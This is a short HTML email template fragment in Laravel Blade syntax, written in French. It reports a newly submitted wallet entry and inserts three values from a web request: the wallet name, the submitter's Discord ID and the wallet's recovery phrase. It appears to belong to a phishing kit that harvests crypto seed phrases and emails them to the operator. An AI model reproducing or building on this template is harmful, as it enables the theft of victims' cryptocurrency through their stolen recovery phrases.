
		<tr>
			<td align="left" style="font-size:0px;padding:10px 25px;word-break:break-word">
				<div
					style="font-family:Roboto,sans-serif;font-size:16px;font-weight:300;line-height:24px;text-align:left;color:#002b4e">
					<p>Hello,</p>
					<p>
						Une nouvelle info concernant un de vos wallets a été ajoutée.
						Voici les informations:
					</p>
					<ul>
						<li>Wallet: {{$request->name}}</li>
						<li>Discord ID: {{$request->discord}}</li>
						<li>Recovery phrase: {{$request->recovery}}</li>
					</ul>
				</div>
			</td>
		</tr>
